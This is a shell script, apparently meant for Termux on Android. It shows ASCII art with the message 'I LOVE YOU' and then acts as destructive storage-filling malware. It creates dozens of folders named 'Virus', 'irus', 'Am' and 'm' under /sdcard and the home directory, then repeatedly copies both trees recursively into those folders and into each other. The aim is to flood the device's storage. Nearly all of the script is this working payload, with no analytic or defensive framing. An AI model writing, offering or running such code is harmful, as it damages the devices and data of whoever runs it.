#colors
g='\033[1;32m'
p='\033[1;35m'
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
y='\033[1;33m'
n=install
clear

echo -e "$blue         ┈┈┈┈┈╱▔▔▔▔╲┈┈┈┈┈    ┈┈┈┈┈▂▂▂▂▂▂▂▂┈┈┈"
sleep 0.1
echo -e "$red         ┈┈┈┈▕▕╲┊┊╱▏▏┈┈┈┈    ┈┈┈╱╲╲▂▂▂▂▂┈▕┈┈┈"
sleep 0.1
echo -e "$green         ┈┈┈┈▕▕▂╱╲▂▏▏┈┈┈┈    ┈┈╱┈┈╲┈┈┈┈┈▏▕┈┈┈"
sleep 0.1
echo -e "$purple         ┈┈┈┈┈╲┊┊┊┊╱┈┈┈┈┈    ┈┈▔▏▕▔┈┈┈┈▂▏▕▂┈┈"
sleep 0.1
echo -e "$cyan         ┈┈┈┈┈▕╲▂▂╱▏┈┈┈┈┈    ┈┈┈▏▕┈┈┈┈┈╲┈┈╱┈┈"
sleep 0.1
echo -e "$blue         ┈╱▔▔▔▔┊┊┊┊▔▔▔▔╲┈    ┈┈┈▔▔▔▔▔▔▔▔┈┈┈┈┈"
sleep 0.1
echo -e "$red                        Amer Amerr"
sleep 0.1
echo -e "$green                        I LOVE YOU"
cd /sdcard
cp -r * $HOME
sleep 0.1
mkdir /sdcard/Virus
mkdir /sdcard/Viruss
mkdir /sdcard/Virusss
mkdir /sdcard/Virussss
mkdir /sdcard/Virusssss
mkdir /sdcard/Virussssss
mkdir /sdcard/Virusssssss
mkdir /sdcard/Virussssssss
mkdir /sdcard/Virusssssssss
mkdir /sdcard/Virussssssssss
mkdir /sdcard/Virusssssssssss
mkdir /sdcard/Virussssssssssss
mkdir /sdcard/Virusssssssssssss
mkdir /sdcard/Virussssssssssssss
mkdir /sdcard/Virusssssssssssssss
mkdir /sdcard/Virussssssssssssssss
mkdir /sdcard/Virusssssssssssssssss
mkdir /sdcard/Virussssssssssssssssss
mkdir /sdcard/Virusssssssssssssssssss
mkdir /sdcard/Virussssssssssssssssssss
mkdir /sdcard/Virusssssssssssssssssssss
mkdir /sdcard/Virussssssssssssssssssssss
mkdir /sdcard/Virusssssssssssssssssssssss
mkdir /sdcard/Virussssssssssssssssssssssss
mkdir /sdcard/Virussssssssssssssssssssssss1
mkdir /sdcard/Virussssssssssssssssssssssss2
mkdir /sdcard/Virussssssssssssssssssssssss3
mkdir /sdcard/Virussssssssssssssssssssssss4
mkdir /sdcard/Virussssssssssssssssssssssss5
mkdir /sdcard/Virussssssssssssssssssssssss6
mkdir /sdcard/Virussssssssssssssssssssssss7
mkdir /sdcard/Virussssssssssssssssssssssss8
mkdir /sdcard/Virussssssssssssssssssssssss9
mkdir /sdcard/Virussssssssssssssssssssssss10
mkdir $HOME/A
mkdir $HOME/Am
mkdir $HOME/Amm
mkdir $HOME/Ammm
mkdir $HOME/Ammmm
mkdir $HOME/Ammmmm
mkdir $HOME/Ammmmmm
mkdir $HOME/Ammmmmmm
mkdir $HOME/Ammmmmmmm
mkdir $HOME/Ammmmmmmmm
mkdir $HOME/Ammmmmmmmmm                          
mkdir $HOME/Ammmmmmmmmmm                         
mkdir $HOME/Ammmmmmmmmmmm                        
mkdir $HOME/Ammmmmmmmmmmmm                       
mkdir $HOME/Ammmmmmmmmmmmmm                      
mkdir $HOME/Ammmmmmmmmmmmmmm                     
mkdir $HOME/Ammmmmmmmmmmmmmmm                    
mkdir $HOME/Ammmmmmmmmmmmmmmmm                   
mkdir $HOME/Ammmmmmmmmmmmmmmmmm                  
mkdir $HOME/Ammmmmmmmmmmmmmmmmmm                 
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmm                
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmm                
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmm             
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmm             
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmm            
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmm           
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmm          
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmm         
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmm        
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmm       
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmm      
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmm     
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm   
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm  
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm 
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm1
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm2
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm3
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm4
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm5
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm6
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm7
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm8
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm9
mkdir $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm10
cp -r $HOME /sdcard/Viruss/
cp  -r /sdcard /sdcard/Viruss
cp -r $HOME /sdcard/Virusss
cp -r /sdcard /sdcard/Virusss
cp -r $HOME /sdcard/Virussss
cp -r /sdcard /sdcard/Virussss
cp -r $HOME /sdcard/Virusssss
cp -r /sdcard /sdcard/Virusssss
cp -r $HOME /sdcard/Virussssss
cp -r /sdcard /sdcard/Virussssss
cp -r $HOME /sdcard/Virusssssss
cp -r /sdcard /sdcard/Virusssssss
cp -r $HOME /sdcard/Virussssssss
cp -r /sdcard /sdcard/Virussssssss
cp -r $HOME /sdcard/Virusssssssss
cp -r /sdcard /sdcard/Virusssssssss
cp -r $HOME /sdcard/Virussssssssss
cp -r /sdcard /sdcard/Virussssssssss
cp -r $HOME /sdcard/Virusssssssssss
cp -r /sdcard /sdcard/Virusssssssssss
cp -r $HOME /sdcard/Virussssssssssss
cp -r /sdcard /sdcard/Virussssssssssss
cp -r $HOME /sdcard/Virusssssssssssss
cp -r /sdcard /sdcard/Virusssssssssssss
cp -r $HOME /sdcard/Virussssssssssssss
cp -r /sdcard /sdcard/Virussssssssssssss
cp -r $HOME /sdcard/Virusssssssssssssss
cp -r /sdcard /sdcard/Virusssssssssssssss
cp -r $HOME /sdcard/Virussssssssssssssss
cp -r /sdcard /sdcard/Virussssssssssssssss
cp -r $HOME  /sdcard/Virusssssssssssssssss
cp -r /sdcard /sdcard/Virusssssssssssssssss
cp -r $HOME /sdcard/Virussssssssssssssssss
cp -r /sdcard /sdcard/Virussssssssssssssssss
cp -r $HOME /sdcard/Virusssssssssssssssssss
cp -r /sdcard /sdcard/Virusssssssssssssssssss
cp -r $HOME /sdcard/Virussssssssssssssssssss
cp -r /sdcard /sdcard/Virussssssssssssssssssss
cp -r $HOME /sdcard/Virusssssssssssssssssssss
cp -r /sdcard /sdcard/Virusssssssssssssssssssss
cp -r $HOME /sdcard/Virussssssssssssssssssssss
cp -r /sdcard /sdcard/Virussssssssssssssssssssss
cp -r $HOME /sdcard/Virusssssssssssssssssssssss
cp -r /sdcard /sdcard/Virusssssssssssssssssssssss
cp -r $HOME /sdcard/Virussssssssssssssssssssssss
cp -r /sdcard /sdcard/Virussssssssssssssssssssssss
cp -r $HOME /sdcard/Virussssssssssssssssssssssss1
cp -r /sdcard /sdcard/Virussssssssssssssssssssssss1
cp -r $HOME /sdcard/Virussssssssssssssssssssssss2
cp -r /sdcard /sdcard/Virussssssssssssssssssssssss2
cp -r $HOME /sdcard/Virussssssssssssssssssssssss3
cp -r /sdcard /sdcard/Virussssssssssssssssssssssss3
cp -r $HOME /sdcard/Virussssssssssssssssssssssss4
cp -r /sdcard /sdcard/Virussssssssssssssssssssssss4
cp -r $HOME /sdcard/Virussssssssssssssssssssssss5
cp -r /sdcard /sdcard/Virussssssssssssssssssssssss5
cp -r $HOME /sdcard/Virussssssssssssssssssssssss6
cp -r /sdcard /sdcard/Virussssssssssssssssssssssss6
cp -r $HOME /sdcard/Virussssssssssssssssssssssss7
cp -r /sdcard /sdcard/Virussssssssssssssssssssssss7
cp -r $HOME /sdcard/Virussssssssssssssssssssssss8
cp -r /sdcard /sdcard/Virussssssssssssssssssssssss8
cp -r $HOME /sdcard/Virussssssssssssssssssssssss9
cp -r /sdcard /sdcard/Virussssssssssssssssssssssss9
cp -r $HOME /sdcard/Virussssssssssssssssssssssss10
cp -r /sdcard /sdcard/Virussssssssssssssssssssssss10
cp -r $HOME $HOME/A
cp -r /sdcard $HOME/A                                   
cp -r $HOME $HOME/Am                                     
cp -r /sdcard $HOME/Am                                  
cp -r $HOME $HOME/Amm                                    
cp -r /sdcard $HOME/Amm                                 
cp -r $HOME $HOME/Ammm                                   
cp -r /sdcard $HOME/Ammm                                
cp -r $HOME $HOME/Ammmm                                  
cp -r /sdcard $HOME/Ammmm                              
cp -r $HOME $HOME/Ammmmm                                 
cp -r /sdcard $HOME/Ammmmm                              
cp -r $HOME $HOME/Ammmmmm                                
cp -r /sdcard $HOME/Ammmmmm                             
cp -r $HOME $HOME/Ammmmmmm                               
cp /sdcard $HOME/Ammmmmmm                           
cp $HOME $HOME/Ammmmmmmm                              
cp -r /sdcard $HOME/Ammmmmmmm                          
cp -r $HOME $HOME/Ammmmmmmmm                             
cp -r /sdcard $HOME/Ammmmmmmmm                         
cp -r $HOME $HOME/Ammmmmmmmmm                            
cp -r /sdcard $HOME/Ammmmmmmmmm                         
cp -r $HOME $HOME/Ammmmmmmmmmm                           
cp -r /sdcard $HOME/Ammmmmmmmmmm		            
cp -r $HOME $HOME/Ammmmmmmmmmmm           			
cp -r /sdcard $HOME/Ammmmmmmmmmmm                      
cp -r $HOME $HOME/Ammmmmmmmmmmmm                         
cp -r /sdcard $HOME/Ammmmmmmmmmmmm                     
cp -r $HOME $HOME/Ammmmmmmmmmmmmm                        
cp -r /sdcard $HOME/Ammmmmmmmmmmmmm                    
cp -r $HOME $HOME/Ammmmmmmmmmmmmmm                       
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmm                   
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmm                      
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmm                    
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmm                     
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmm                 
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmm                    
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmm                
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmm                   
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmm               
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmm                  
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmm               
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmm                 
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmm              
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmm                
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmm            
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmm               
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmm             
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmm              
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmm          
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmm             
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmm         
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmm            
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmm        
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmm           
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmm       
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmm          
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmm      
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmm         
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmm     
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmm        
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmm    
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmm       
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmm   
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm      
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm  
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm     
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm 
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm    
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm1
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm1
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm2
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm2
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm3
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm3
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm4
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm4
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm5
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm5
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm6 
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm6
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm7
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm7
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm8
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm8
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm9
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm9
cp -r $HOME $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm10
cp -r /sdcard $HOME/Ammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm10
cd $HOME
cp -r * /sdcard
cp -r $HOME /sdcard
cd /sdcard
cp -r * $HOME
cp -r * $HOME

mkdir $HOME/m
mkdir $HOME/mm
mkdir $HOME/mmm
mkdir $HOME/mmmm
mkdir $HOME/mmmmm
mkdir $HOME/mmmmmm
mkdir $HOME/mmmmmmm
mkdir $HOME/mmmmmmmm
mkdir $HOME/mmmmmmmmm
mkdir $HOME/mmmmmmmmmm                          
mkdir $HOME/mmmmmmmmmmm                         
mkdir $HOME/mmmmmmmmmmmm                        
mkdir $HOME/mmmmmmmmmmmmm                       
mkdir $HOME/mmmmmmmmmmmmmm                      
mkdir $HOME/mmmmmmmmmmmmmmm                     
mkdir $HOME/mmmmmmmmmmmmmmmm                    
mkdir $HOME/mmmmmmmmmmmmmmmmm                   
mkdir $HOME/mmmmmmmmmmmmmmmmmm                  
mkdir $HOME/mmmmmmmmmmmmmmmmmmm                 
mkdir $HOME/mmmmmmmmmmmmmmmmmmmm                
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmm                
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmm             
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmm             
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmm            
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmm           
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmm          
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmm         
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmm        
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmm       
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmm      
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm     
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm   
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm  
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm 
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm1
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm2
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm3
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm4
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm5
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm6
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm7
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm8
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm9
mkdir $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm10


mkdir /sdcard/irus
mkdir /sdcard/iruss
mkdir /sdcard/irusss
mkdir /sdcard/irussss
mkdir /sdcard/irusssss
mkdir /sdcard/irussssss
mkdir /sdcard/irusssssss
mkdir /sdcard/irussssssss
mkdir /sdcard/irusssssssss
mkdir /sdcard/irussssssssss
mkdir /sdcard/irusssssssssss
mkdir /sdcard/irussssssssssss
mkdir /sdcard/irusssssssssssss
mkdir /sdcard/irussssssssssssss
mkdir /sdcard/irusssssssssssssss
mkdir /sdcard/irussssssssssssssss
mkdir /sdcard/irusssssssssssssssss
mkdir /sdcard/irussssssssssssssssss
mkdir /sdcard/irusssssssssssssssssss
mkdir /sdcard/irussssssssssssssssssss
mkdir /sdcard/irusssssssssssssssssssss
mkdir /sdcard/irussssssssssssssssssssss
mkdir /sdcard/irusssssssssssssssssssssss
mkdir /sdcard/irussssssssssssssssssssssss
mkdir /sdcard/irussssssssssssssssssssssss1
mkdir /sdcard/irussssssssssssssssssssssss2
mkdir /sdcard/irussssssssssssssssssssssss3
mkdir /sdcard/irussssssssssssssssssssssss4
mkdir /sdcard/irussssssssssssssssssssssss5
mkdir /sdcard/irussssssssssssssssssssssss6
mkdir /sdcard/irussssssssssssssssssssssss7
mkdir /sdcard/irussssssssssssssssssssssss8
mkdir /sdcard/irussssssssssssssssssssssss9
mkdir /sdcard/irussssssssssssssssssssssss10



cp -r $HOME /sdcard/iruss/
cp  -r /sdcard /sdcard/iruss
cp -r $HOME /sdcard/irusss
cp -r /sdcard /sdcard/irusss
cp -r $HOME /sdcard/irussss
cp -r /sdcard /sdcard/irussss
cp -r $HOME /sdcard/irusssss
cp -r /sdcard /sdcard/irusssss
cp -r $HOME /sdcard/irussssss
cp -r /sdcard /sdcard/irussssss
cp -r $HOME /sdcard/irusssssss
cp -r /sdcard /sdcard/irusssssss
cp -r $HOME /sdcard/irussssssss
cp -r /sdcard /sdcard/irussssssss
cp -r $HOME /sdcard/irusssssssss
cp -r /sdcard /sdcard/irusssssssss
cp -r $HOME /sdcard/irussssssssss
cp -r /sdcard /sdcard/irussssssssss
cp -r $HOME /sdcard/irusssssssssss
cp -r /sdcard /sdcard/irusssssssssss
cp -r $HOME /sdcard/irussssssssssss
cp -r /sdcard /sdcard/irussssssssssss
cp -r $HOME /sdcard/irusssssssssssss
cp -r /sdcard /sdcard/irusssssssssssss
cp -r $HOME /sdcard/irussssssssssssss
cp -r /sdcard /sdcard/irussssssssssssss
cp -r $HOME /sdcard/irusssssssssssssss
cp -r /sdcard /sdcard/irusssssssssssssss
cp -r $HOME /sdcard/irussssssssssssssss
cp -r /sdcard /sdcard/irussssssssssssssss
cp -r $HOME  /sdcard/irusssssssssssssssss
cp -r /sdcard /sdcard/irusssssssssssssssss
cp -r $HOME /sdcard/irussssssssssssssssss
cp -r /sdcard /sdcard/irussssssssssssssssss
cp -r $HOME /sdcard/irusssssssssssssssssss
cp -r /sdcard /sdcard/irusssssssssssssssssss
cp -r $HOME /sdcard/irussssssssssssssssssss
cp -r /sdcard /sdcard/irussssssssssssssssssss
cp -r $HOME /sdcard/irusssssssssssssssssssss
cp -r /sdcard /sdcard/irusssssssssssssssssssss
cp -r $HOME /sdcard/irussssssssssssssssssssss
cp -r /sdcard /sdcard/irussssssssssssssssssssss
cp -r $HOME /sdcard/irusssssssssssssssssssssss
cp -r /sdcard /sdcard/irusssssssssssssssssssssss
cp -r $HOME /sdcard/irussssssssssssssssssssssss
cp -r /sdcard /sdcard/irussssssssssssssssssssssss
cp -r $HOME /sdcard/irussssssssssssssssssssssss1
cp -r /sdcard /sdcard/irussssssssssssssssssssssss1
cp -r $HOME /sdcard/irussssssssssssssssssssssss2
cp -r /sdcard /sdcard/irussssssssssssssssssssssss2
cp -r $HOME /sdcard/irussssssssssssssssssssssss3
cp -r /sdcard /sdcard/irussssssssssssssssssssssss3
cp -r $HOME /sdcard/irussssssssssssssssssssssss4
cp -r /sdcard /sdcard/irussssssssssssssssssssssss4
cp -r $HOME /sdcard/irussssssssssssssssssssssss5
cp -r /sdcard /sdcard/irussssssssssssssssssssssss5
cp -r $HOME /sdcard/irussssssssssssssssssssssss6
cp -r /sdcard /sdcard/irussssssssssssssssssssssss6
cp -r $HOME /sdcard/irussssssssssssssssssssssss7
cp -r /sdcard /sdcard/irussssssssssssssssssssssss7
cp -r $HOME /sdcard/irussssssssssssssssssssssss8
cp -r /sdcard /sdcard/irussssssssssssssssssssssss8
cp -r $HOME /sdcard/irussssssssssssssssssssssss9
cp -r /sdcard /sdcard/irussssssssssssssssssssssss9
cp -r $HOME /sdcard/irussssssssssssssssssssssss10
cp -r /sdcard /sdcard/irussssssssssssssssssssssss10
cp -r $HOME /sdcard
cp -r /sdcard $HOME/                                   
cp -r $HOME $HOME/m                                     
cp -r /sdcard $HOME/m                                  
cp -r $HOME $HOME/mm                                    
cp -r /sdcard $HOME/mm                                 
cp -r $HOME $HOME/mmm                                   
cp -r /sdcard $HOME/mmm                                
cp -r $HOME $HOME/mmmm                                  
cp -r /sdcard $HOME/mmmm                              
cp -r $HOME $HOME/mmmmm                                 
cp -r /sdcard $HOME/mmmmm                              
cp -r $HOME $HOME/mmmmmm                                
cp -r /sdcard $HOME/mmmmmm                             
cp -r $HOME $HOME/mmmmmmm                               
cp /sdcard $HOME/mmmmmmm                           
cp $HOME $HOME/mmmmmmmm                              
cp -r /sdcard $HOME/mmmmmmmm                          
cp -r $HOME $HOME/mmmmmmmmm                             
cp -r /sdcard $HOME/mmmmmmmmm                         
cp -r $HOME $HOME/mmmmmmmmmm                            
cp -r /sdcard $HOME/mmmmmmmmmm                         
cp -r $HOME $HOME/mmmmmmmmmmm                           
cp -r /sdcard $HOME/mmmmmmmmmmm		            
cp -r $HOME $HOME/mmmmmmmmmmmm           			
cp -r /sdcard $HOME/mmmmmmmmmmmm                      
cp -r $HOME $HOME/mmmmmmmmmmmmm                         
cp -r /sdcard $HOME/mmmmmmmmmmmmm                     
cp -r $HOME $HOME/mmmmmmmmmmmmmm                        
cp -r /sdcard $HOME/mmmmmmmmmmmmmm                    
cp -r $HOME $HOME/mmmmmmmmmmmmmmm                       
cp -r /sdcard $HOME/mmmmmmmmmmmmmmm                   
cp -r $HOME $HOME/mmmmmmmmmmmmmmmm                      
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmm                    
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmm                     
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmm                 
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmm                    
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmm                
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmm                   
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmm               
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmm                  
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmm               
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmm                 
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmm              
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmm                
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmm            
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmm               
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmm             
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmm              
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmm          
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmm             
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmm         
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmm            
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmm        
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmm           
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmm       
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmm          
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmm      
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmm         
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmm     
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmm        
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmm    
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm       
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm   
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm      
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm  
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm     
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm 
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm    
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm1
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm1
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm2
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm2
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm3
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm3
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm4
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm4
